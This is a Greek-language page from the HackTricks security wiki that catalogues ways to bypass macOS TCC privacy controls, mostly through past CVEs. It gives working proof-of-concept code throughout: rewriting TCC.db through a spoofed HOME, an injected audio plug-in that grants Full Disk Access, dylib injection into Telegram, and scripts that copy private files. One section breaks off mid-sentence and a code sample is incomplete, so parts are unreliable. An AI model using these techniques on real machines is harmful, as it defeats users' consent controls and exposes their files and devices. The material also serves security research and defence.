# Διασπάσεις του TCC στο macOS

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον επαγγελματία με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF**, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Ανάλογα με τη λειτουργικότητα

### Διάβασμα Διάβασμα

Αυτό δεν είναι μια διάβαση, απλώς έτσι λειτουργεί το TCC: **Δεν προστατεύει από την εγγραφή**. Αν η Εντολική Γραμμή **δεν έχει πρόσβαση για να διαβάσει την επιφάνεια εργασίας ενός χρήστη, μπορεί ακόμα να γράψει σε αυτήν**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
Το **επεκτεινόμενο χαρακτηριστικό `com.apple.macl`** προστίθεται στο νέο **αρχείο** για να δώσει στην **εφαρμογή δημιουργού** πρόσβαση για ανάγνωσή του.

### Διάβασμα μέσω SSH

Από προεπιλογή, η πρόσβαση μέσω **SSH είχε "Πλήρη πρόσβαση στον δίσκο"**. Για να απενεργοποιήσετε αυτήν την πρόσβαση, πρέπει να είναι καταχωρημένη αλλά απενεργοποιημένη (η αφαίρεσή της από τη λίστα δεν θα αφαιρέσει αυτά τα προνόμια):

![](<../../../../../.gitbook/assets/image (569).png>)

Εδώ μπορείτε να βρείτε παραδείγματα πώς ορισμένα **κακόβουλα προγράμματα** έχουν καταφέρει να παρακάμψουν αυτήν την προστασία:

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
Σημειώστε ότι τώρα, για να μπορέσετε να ενεργοποιήσετε το SSH, χρειάζεστε **Πλήρη πρόσβαση στον δίσκο**.
{% endhint %}

### Χειρισμός επεκτάσεων - CVE-2022-26767

Το χαρακτηριστικό **`com.apple.macl`** δίνεται σε αρχεία για να δώσει σε μια **συγκεκριμένη εφαρμογή δικαιώματα για να το διαβάσει**. Αυτό το χαρακτηριστικό ορίζεται όταν κάνετε **σύρσιμο και απόθεση** ενός αρχείου πάνω σε μια εφαρμογή, ή όταν ο χρήστης **κάνει διπλό κλικ** σε ένα αρχείο για να το ανοίξει με την **προεπιλεγμένη εφαρμογή**.

Έτσι, ένας χρήστης μπορεί να **καταχωρήσει μια κακόβουλη εφαρμογή** για να χειριστεί όλες τις επεκτάσεις και να καλέσει τις Υπηρεσίες Εκκίνησης για να **ανοίξει** οποιοδήποτε αρχείο (έτσι το κακόβουλο αρχείο θα έχει πρόσβαση για να το διαβάσει).

### iCloud

Με το δικαίωμα **`com.apple.private.icloud-account-access`** είναι δυνατή η επικοινωνία με την υπηρεσία XPC **`com.apple.iCloudHelper`** η οποία θα **παρέχει διαπιστευτήρια iCloud**.

Το **iMovie** και το **Garageband** είχαν αυτό το δικαίωμα και άλλα που επιτρέπονταν.

Για περισσότερες **πληροφορίες** σχετικά με την εκμετάλλευση για την **απόκτηση διαπιστευτηρίων iCloud** από αυτό το δικαίωμα, δείτε την ομιλία: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

Μια εφαρμογή με το δικαίωμα **`kTCCServiceAppleEvents`** θα μπορεί να **ελέγχει άλλες εφαρμογές**. Αυτό σημαίνει ότι μπορεί να **καταχραστεί τα δικαιώματα που έχουν χορηγηθεί στις άλλες εφαρμογές**.

Για περισσότερες πληροφορίες σχετικά με τα Apple Scripts, ανατρέξτε στο:

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

Για παράδειγμα, αν μια εφαρμογή έχει **δικαίωμα Automation πάνω στο `iTerm`**, για παράδειγμα σε αυτό το παράδειγμα το **`Terminal`** έχει πρόσβαση στο iTerm:

<figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### Πάνω στο iTerm

Το Terminal, που δεν έχει Πλήρη πρόσβαση στον δίσκο, μπορεί να καλέσει το iTerm, που το έχει, και να το χρησιμοποιήσει για να εκτελέσει ενέργειες:

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
{% endcode %}
```bash
osascript iterm.script
```
#### Πάνω από το Finder

Ή αν μια εφαρμογή έχει πρόσβαση πάνω από το Finder, μπορεί να χρησιμοποιήσει ένα σενάριο όπως αυτό:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Με βάση τη συμπεριφορά της εφαρμογής

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Το δαίμονας **tccd** στον χώρο χρήστη χρησιμοποιεί τη μεταβλητή περιβάλλοντος **`HOME`** για να έχει πρόσβαση στη βάση δεδομένων χρηστών TCC από: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Σύμφωνα με [αυτήν την ανάρτηση στο Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) και επειδή ο δαίμονας TCC εκτελείται μέσω του `launchd` εντός του τρέχοντος πεδίου χρήστη, είναι δυνατό να **ελέγξετε όλες τις μεταβλητές περιβάλλοντος** που του περνιούνται.\
Έτσι, ένας **επιτιθέμενος μπορεί να ορίσει τη μεταβλητή περιβάλλοντος `$HOME`** στο **`launchctl`** για να δείχνει σε έναν **ελεγχόμενο κατάλογο**, να **επανεκκινήσει** τον δαίμονα **TCC** και στη συνέχεια να **τροποποιήσει απευθείας τη βάση δεδομένων TCC** για να αποκτήσει **κάθε δικαίωμα TCC** που είναι διαθέσιμο χωρίς να ζητήσει ποτέ την έγκριση του τελικού χρήστη.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Σημειώσεις

Οι Σημειώσεις είχαν πρόσβαση σε προστατευμένες τοποθεσίες TCC, αλλά όταν δημιουργείται μια σημείωση αυτή δημιουργείται σε μια μη προστατευμένη τοποθεσία. Έτσι, μπορείτε να ζητήσετε από τις Σημειώσεις να αντιγράψουν ένα προστατευμένο αρχείο σε μια σημείωση (δηλαδή σε μια μη προστατευμένη τοποθεσία) και στη συνέχεια να έχετε πρόσβαση στο αρχείο:

<figure><img src="../../../../../.gitbook/assets/image (6) (1) (3).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Μετακίνηση

Το δυαδικό αρχείο `/usr/libexec/lsd` με τη βιβλιοθήκη `libsecurity_translocate` είχε το entitlement `com.apple.private.nullfs_allow`, το οποίο του επέτρεπε να δημιουργήσει ένα **nullfs** mount, και είχε το entitlement `com.apple.private.tcc.allow` με το **`kTCCServiceSystemPolicyAllFiles`** για πρόσβαση σε κάθε αρχείο.

Ήταν δυνατό να προστεθεί το χαρακτηριστικό καραντίνας στο "Library", να καλεστεί η υπηρεσία XPC **`com.apple.security.translocation`** και στη συνέχεια να αντιστοιχιστεί το Library στο **`$TMPDIR/AppTranslocation/d/d/Library`**, όπου θα ήταν δυνατή η **πρόσβαση** σε όλα τα έγγραφα μέσα στο Library.

### CVE-2023-38571 - Μουσική & Τηλεόραση <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

Η εφαρμογή **`Μουσική`** έχει μια ενδιαφέρουσα λειτουργία: Όταν εκτελείται, θα **εισάγει** τα αρχεία που αποθηκεύονται στο **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** στη "βιβλιοθήκη πολυμέσων" του χρήστη. Επιπλέον, καλεί κάτι σαν: **`rename(a, b);`** όπου `a` και `b` είναι:

* `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
* `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`

Αυτή η συμπεριφορά του **`rename(a, b);`** είναι ευάλωτη σε μια **Συνθήκη Ανταγωνισμού**, καθώς είναι δυνατό να τοποθετηθεί ένα ψεύτικο αρχείο **TCC.db** μέσα στον φάκελο `Automatically Add to Music.localized` και στη συνέχεια, όταν δημιουργηθεί ο νέος φάκελος (b), να αντιγραφεί το αρχείο, να διαγραφεί και να ανακατευθυνθεί στο **`~/Library/Application Support/com.apple.TCC`**/.

### SQLITE\_SQLLOG\_DIR - CVE-2023-32422

Εάν η μεταβλητή περιβάλλοντος **`SQLITE_SQLLOG_DIR="path/folder"`**, αυτό σημαίνει ότι **οποιαδήποτε ανοικτή βάση δεδομένων αντιγράφεται σε αυτήν τη διαδρομή**. Σε αυτήν την ευπάθεια, αυτός ο έλεγχος καταχωρίστηκε για να **γράψει** μέσα σε μια **βάση δεδομένων SQLite** που θα ανοίξει ένας διεργασία με τη βάση δεδομένων TCC, και στη συνέχεια να καταχραστεί το **`SQLITE_SQLLOG_DIR`** με ένα **symlink στο όνομα αρχείου**, έτσι ώστε όταν αυτή η βάση δεδομένων ανοίγει, ο χρήστης **TCC.db αντικαθίσταται** με το ανοικτό αρχείο.

**Περισσότερες πληροφορίες** [**στο writeup**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **και** [**στην ομιλία**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s).

### **SQLITE\_AUTO\_TRACE**

Εάν η μεταβλητή περιβάλλοντος **`SQLITE_AUTO_TRACE`** έχει οριστεί, η βιβλιοθήκη **`libsqlite3.dylib`** θα αρχίσει να καταγράφει όλα τα αιτήματα SQL. Πολλές εφαρμογές χρησιμοποιούν αυτήν τη βιβλιοθήκη, οπότε ήταν δυνατό να καταγραφούν όλα τα αιτήματα SQLite τους.

Πολλές εφαρμογές της Apple χρησιμοποιούσαν αυτήν τη βιβλιοθήκη για να έχουν πρόσβαση σε προστατευμένες πληροφορίες TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL\_DUMP\_PIPELINES\_TO\_JSON\_FILE - CVE-2023-32407

Αυτή η **μεταβλητή περιβάλλοντος χρησιμοποιείται από το πλαίσιο `Metal`** το οποίο είναι μια εξάρτηση για διάφορα προγράμματα, κυρίως το `Music`, το οποίο έχει FDA.

Ορίζοντας το εξής: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. Εάν το `path` είναι ένας έγκυρος φάκελος, το σφάλμα θα ενεργοποιηθεί και μπορούμε να χρησιμοποιήσουμε το `fs_usage` για να δούμε τι συμβαίνει στο πρόγραμμα:

* θα ανοίξει ένα αρχείο με την `open()`, με το όνομα `path/.dat.nosyncXXXX.XXXXXX` (το Χ είναι τυχαίο)
* ένα ή περισσότερα `write()` θα γράψουν το περιεχόμενο στο αρχείο (δεν το ελέγχουμε εμείς)
* το `path/.dat.nosyncXXXX.XXXXXX` θα μετονομαστεί με το `rename()` σε `path/name`

Πρόκειται για μια προσωρινή εγγραφή αρχείου, ακολουθούμενη από μια **`rename(old, new)`** **η οποία δεν είναι ασφαλής**.

Δεν είναι ασφαλές επειδή πρέπει να **επιλύσει ξεχωριστά τα παλιά και τα νέα μονοπάτια**, το οποίο μπορεί να πάρει κάποιο χρόνο και να είναι ευάλωτο σε έναν ανταγωνισμό κατάστασης (Race Condition). Για περισσότερες πληροφορίες μπορείτε να ελέγξετε τη συνάρτηση `xnu` `renameat_internal()`.

{% hint style="danger" %}
Ουσιαστικά, αν ένα προνομιούχο διεργασίας μετονομάζει από έναν φάκελο που ελέγχετε, μπορείτε να κερδίσετε ένα RCE και να τον καταναλώσετε να έχει πρόσβαση σε ένα διαφορετικό αρχείο ή, όπως σε αυτήν την CVE, να ανοίξει το αρχείο που δημιούργησε το προνομιούχο πρόγραμμα και να αποθηκεύσει ένα FD.

Εάν η μετονομασία προσπελάσει έναν φάκελο που ελέγχετε, ενώ έχετε τροποποιήσει το αρχείο προέλευσης ή έχετε ένα FD για αυτό, μπορείτε να αλλάξετε το αρχείο προορισμού (ή τον φάκελο) για να δείχνει ένα σύμβολο σύνδεσης, έτσι ώστε να μπορείτε να γράψετε όποτε θέλετε.
{% endhint %}

Αυτή ήταν η επίθεση στην CVE: Για παράδειγμα, για να αντικαταστήσουμε το `TCC.db` του χρήστη, μπορούμε:

* να δημιουργήσουμε το `/Users/hacker/ourlink` που να δείχνει στο `/Users/hacker/Library/Application Support/com.apple.TCC/`
* να δημιουργήσουμε τον φάκελο `/Users/hacker/tmp/`
* να ορίσουμε το `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
* να ενεργοποιήσουμε το σφάλμα εκτελώντας το `Music` με αυτήν τη μεταβλητή περιβάλλοντος
* να παρακολουθήσουμε την `open()` του `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (το Χ είναι τυχαίο)
* εδώ επίσης ανοίγουμε αυτό το αρχείο για εγγραφή και κρατάμε τον αναγνωριστικό αρχείου
* να αντικαταστήσουμε ατομικά τον `/Users/hacker/tmp` με τον `/Users/hacker/ourlink` **σε ένα βρόχο**
* κάνουμε αυτό για να αυξήσουμε τις πιθανότητές μας να επιτύχουμε καθώς το παράθυρο ανταγωνισμού είναι πολύ στενό, αλλά η απώλεια του αγώνα έχει αμελητέα αρνητική επίπτωση
* να περιμένουμε λίγο
* να ελέγξουμε αν είχαμε τύχη
* αν όχι, να εκτελέσουμε ξανά από την αρχή

Περισσότερες πληροφορίες στο [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

{% hint style="danger" %}
Τώρα, εάν προσπαθήσετε να χρησιμοποιήσετε τη μεταβλητή περιβάλλοντος `MTL_DUMP_PIPELINES_TO_JSON_FILE`, τα προγράμματα δεν θα ξεκινήσουν
{% endhint %}

### Apple Remote Desktop

Ως ρουτ, μπορείτε να ενεργοποιήσετε αυτήν την υπηρεσία και ο πράκτορας
### CVE-2020-29621 - Coreaudiod

Το δυαδικό αρχείο **`/usr/sbin/coreaudiod`** είχε τις εξουσιοδοτήσεις `com.apple.security.cs.disable-library-validation` και `com.apple.private.tcc.manager`. Η πρώτη επιτρέπει την **εισαγωγή κώδικα** και η δεύτερη του παρέχει πρόσβαση για **διαχείριση του TCC**.

Αυτό το δυαδικό αρχείο επέτρεπε τη φόρτωση **πρόσθετων από τρίτους** από τον φάκελο `/Library/Audio/Plug-Ins/HAL`. Επομένως, ήταν δυνατό να **φορτωθεί ένα πρόσθετο και να καταχραστούν οι άδειες του TCC** με αυτό το PoC:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Για περισσότερες πληροφορίες, ελέγξτε την [**αρχική αναφορά**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Πρόσθετα Επιπέδου Αφαίρεσης Συσκευής (Device Abstraction Layer - DAL)

Οι εφαρμογές συστήματος που ανοίγουν ροή κάμερας μέσω του Core Media I/O (εφαρμογές με **`kTCCServiceCamera`**) φορτώνουν **στη διαδικασία αυτές τις προσθήκες** που βρίσκονται στο `/Library/CoreMediaIO/Plug-Ins/DAL` (δεν περιορίζονται από το SIP).

Απλά αποθηκεύοντας εκεί μια βιβλιοθήκη με τον κοινό **κατασκευαστή** θα λειτουργήσει για να **εισαγάγει κώδικα**.

Πολλές εφαρμογές της Apple ήταν ευάλωτες σε αυτό.

### Firefox

Η εφαρμογή Firefox είχε τις εξουσιοδοτήσεις `com.apple.security.cs.disable-library-validation` και `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Για περισσότερες πληροφορίες σχετικά με το πώς να εκμεταλλευτείτε αυτό, [**ελέγξτε την αρχική αναφορά**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Το δυαδικό αρχείο `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` είχε τις εξουσιοδοτήσεις **`com.apple.private.tcc.allow`** και **`com.apple.security.get-task-allow`**, που επέτρεπαν την εισαγωγή κώδικα μέσα στη διεργασία και τη χρήση των προνομίων TCC.

### CVE-2023-26818 - Telegram

Το Telegram είχε τις εξουσιοδοτήσεις **`com.apple.security.cs.allow-dyld-environment-variables`** και **`com.apple.security.cs.disable-library-validation`**, επομένως ήταν δυνατό να το καταχραστείτε για να **αποκτήσετε πρόσβαση στα δικαιώματά του**, όπως η εγγραφή με την κάμερα. Μπορείτε [**να βρείτε το φορτίο στην ανάλυση**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Σημειώστε πώς χρησιμοποιείται η μεταβλητή περιβάλλοντος για να φορτωθεί μια βιβλιοθήκη, δημιουργήθηκε ένα **προσαρμοσμένο plist** για να εισαχθεί αυτή η βιβλιοθήκη και χρησιμοποιήθηκε το **`launchctl`** για να την εκκινήσει:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Με ανοιχτές κλήσεις

Είναι δυνατό να κληθεί η εντολή **`open`** ακόμα και όταν είναι ενεργοποιημένο το sandbox.

### Σενάρια τερματικού

Συνήθως, είναι συνηθισμένο να δίνεται πλήρης πρόσβαση στον δίσκο (Full Disk Access - FDA) στο τερματικό, τουλάχιστον σε υπολογιστές που χρησιμοποιούνται από τεχνικά άτομα. Και είναι δυνατό να κληθούν σενάρια **`.terminal`** χρησιμοποιώντας αυτήν την πρόσβαση.

Τα σενάρια **`.terminal`** είναι αρχεία plist όπως αυτό εδώ με την εντολή που θα εκτελεστεί στο κλειδί **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Μια εφαρμογή μπορεί να γράψει ένα σενάριο τερματικού σε έναν τοποθεσία όπως το /tmp και να το εκτελέσει με ένα εντολή όπως:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Με την προσάρτηση

### CVE-2020-9771 - παράκαμψη TCC και ανέλιξη προνομίων με την προσάρτηση του mount\_apfs

**Οποιοσδήποτε χρήστης** (ακόμα και μη προνομιούχος) μπορεί να δημιουργήσει και να προσαρτήσει ένα αντίγραφο ασφαλείας του time machine και να έχει πρόσβαση σε **ΟΛΑ τα αρχεία** αυτού του αντιγράφου ασφαλείας.\
Το **μόνο προνομιούχο** που απαιτείται είναι για την εφαρμογή που χρησιμοποιείται (όπως το `Terminal`) να έχει **Πλήρη Πρόσβαση Δίσκου** (FDA) (`kTCCServiceSystemPolicyAllfiles`) που πρέπει να χορηγηθεί από έναν διαχειριστή.

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

Μια πιο λεπτομερής εξήγηση μπορεί να βρεθεί [**στην αρχική αναφορά**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Τοποθέτηση πάνω από το αρχείο TCC

Ακόμα κι αν το αρχείο TCC DB είναι προστατευμένο, ήταν δυνατό να **τοποθετηθεί πάνω από τον κατάλογο** ένα νέο αρχείο TCC.db:

{% code overflow="wrap" %}
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
{% endcode %}
```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Ελέγξτε την **πλήρη εκμετάλλευση** στο [**αρχικό άρθρο**](https://theevilbit.github.io/posts/cve-2021-30808/).

### asr

Το εργαλείο **`/usr/sbin/asr`** επέτρεπε την αντιγραφή ολόκληρου του δίσκου και την προσάρτησή του σε άλλη θέση παρακάμπτοντας τις προστασίες TCC.

### Υπηρεσίες τοποθεσίας

Υπάρχει μια τρίτη βάση δεδομένων TCC στο **`/var/db/locationd/clients.plist`** για να υποδείξει τους επιτρεπόμενους πελάτες να **έχουν πρόσβαση στις υπηρεσίες τοποθεσίας**.\
Ο φάκελος **`/var/db/locationd/` δεν ήταν προστατευμένος από την προσάρτηση DMG**, οπότε ήταν δυνατή η προσάρτηση του δικού μας plist.

## Με τις εφαρμογές εκκίνησης

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## Με την εντολή grep

Σε πολλές περιπτώσεις, τα αρχεία θα αποθηκεύουν ευαίσθητες πληροφορίες όπως ηλεκτρονικά ταχυδρομεία, αριθμούς τηλεφώνου, μηνύματα... σε μη προστατευμένες θέσεις (που θεωρούνται ευπάθεια στο Apple).

<figure><img src="../../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

## Συνθετικά κλικ

Αυτό δεν λειτουργεί πλέον, αλλά [**λειτουργούσε στο παρελθόν**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

Μια άλλη μέθοδος χρησιμοποιώντας [**γεγονότα CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf):

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

## Αναφορά

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Τρόποι για Παράκαμψη των Μηχανισμών Απορρήτου του macOS**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Νίκη κατά του TCC - 20+ ΝΕΟΙ Τρόποι για Παράκαμψη των Μηχανισμών Απορρήτου του MacOS**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF**, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας για το hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
